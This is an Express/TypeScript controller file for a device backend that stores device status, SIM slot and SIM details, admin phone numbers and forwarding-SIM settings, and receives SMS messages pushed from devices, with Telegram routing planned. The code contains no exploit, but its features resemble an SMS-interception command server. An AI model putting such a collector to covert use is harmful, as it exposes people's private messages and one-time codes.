import { Request, Response } from "express";
import logger from "../logger/logger";
import * as deviceService from "../services/deviceService";
import * as smsService from "../services/smsService";
import wsService from "../services/wsService";

/**
 * Thin controllers matching the routes.
 * Each controller responds with { success, error? } where appropriate.
 *
 * SMS behavior:
 * - SENDSMS=no  -> smsService skips DB save
 * - SENDSMS=yes or missing -> normal DB save
 *
 * NOTE:
 * Telegram routing is NOT implemented in this file because the telegram
 * service/helper file has not been provided yet.
 */

export async function upsertDevice(req: Request, res: Response) {
  const deviceId = req.params.deviceId;
  const body = req.body || {};
  try {
    await deviceService.upsertDeviceMetadata(deviceId, body);
    logger.info("controller: upsertDevice", { deviceId });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: upsertDevice failed", err);
    return res
      .status(500)
      .json({ success: false, error: err?.message || "server error" });
  }
}

export async function updateStatus(req: Request, res: Response) {
  const deviceId = req.params.deviceId;
  const { online, timestamp } = req.body || {};
  try {
    await deviceService.updateDeviceStatus(
      deviceId,
      !!online,
      typeof timestamp !== "undefined" ? Number(timestamp) : undefined,
    );

    try {
      wsService.notifyDeviceStatus(deviceId, {
        online: !!online,
        timestamp: Number(timestamp || Date.now()),
      });
    } catch (e) {
      // ignore
    }

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: updateStatus failed", err);
    return res
      .status(500)
      .json({ success: false, error: err?.message || "server error" });
  }
}

export async function updateSimSlot(req: Request, res: Response) {
  const deviceId = req.params.deviceId;
  const slot = req.params.slot;
  const { status, updatedAt } = req.body || {};
  try {
    await deviceService.updateSimSlot(
      deviceId,
      slot,
      status || "inactive",
      typeof updatedAt !== "undefined" ? Number(updatedAt) : undefined,
    );
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: updateSimSlot failed", err);
    return res
      .status(500)
      .json({ success: false, error: err?.message || "server error" });
  }
}

export async function upsertSimInfo(req: Request, res: Response) {
  const deviceId = req.params.deviceId;
  const simInfo = req.body || null;
  if (!simInfo) {
    return res.status(400).json({ success: false, error: "missing simInfo" });
  }

  try {
    await deviceService.upsertSimInfo(deviceId, simInfo);
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: upsertSimInfo failed", err);
    return res
      .status(500)
      .json({ success: false, error: err?.message || "server error" });
  }
}

export async function getAdmins(req: Request, res: Response) {
  const id = req.params.id;
  try {
    const admins = await deviceService.getDeviceAdmins(id);
    return res.json(admins);
  } catch (err: any) {
    logger.error("controller: getAdmins failed", err);
    return res.status(500).json([]);
  }
}

export async function getAdminPhone(req: Request, res: Response) {
  const id = req.params.id;
  try {
    const phone = await deviceService.getDeviceAdminPhone(id);
    return res.json(phone);
  } catch (err: any) {
    logger.error("controller: getAdminPhone failed", err);
    return res.status(500).json("");
  }
}

export async function getForwardingSim(req: Request, res: Response) {
  const id = req.params.id;
  try {
    await deviceService.getDeviceAdmins(id);
    const deviceDoc = await deviceService.upsertDeviceMetadata(id, {});
    const forwarding = (deviceDoc as any)?.forwardingSim || "auto";
    return res.json(forwarding);
  } catch (err: any) {
    logger.error("controller: getForwardingSim failed", err);
    return res.status(500).json("auto");
  }
}

export async function pushSms(req: Request, res: Response) {
  const id = req.params.id;
  const body = req.body || {};

  try {
    const sendSmsEnv = String(process.env.SENDSMS || "yes")
      .trim()
      .toLowerCase();

    const payload = {
      sender: body.sender || body.from || "unknown",
      receiver: body.receiver || body.recv || "",
      title: body.title || "",
      body: body.body || body.message || "",
      timestamp: Number(body.timestamp || Date.now()),
      meta: body.meta || {},
    };

    const savedDoc = await smsService.saveSms(id, payload);

    if (sendSmsEnv === "no") {
      logger.info("controller: pushSms processed with SENDSMS=no", {
        deviceId: id,
        sender: payload.sender,
        savedToDb: false,
      });

      return res.json({
        success: true,
        savedToDb: false,
        message: "SMS received; DB save disabled by SENDSMS=no",
      });
    }

    logger.info("controller: pushSms processed normally", {
      deviceId: id,
      sender: payload.sender,
      savedToDb: !!savedDoc,
    });

    return res.json({
      success: true,
      savedToDb: !!savedDoc,
    });
  } catch (err: any) {
    logger.error("controller: pushSms failed", err);
    return res
      .status(500)
      .json({ success: false, error: err?.message || "server error" });
  }
}
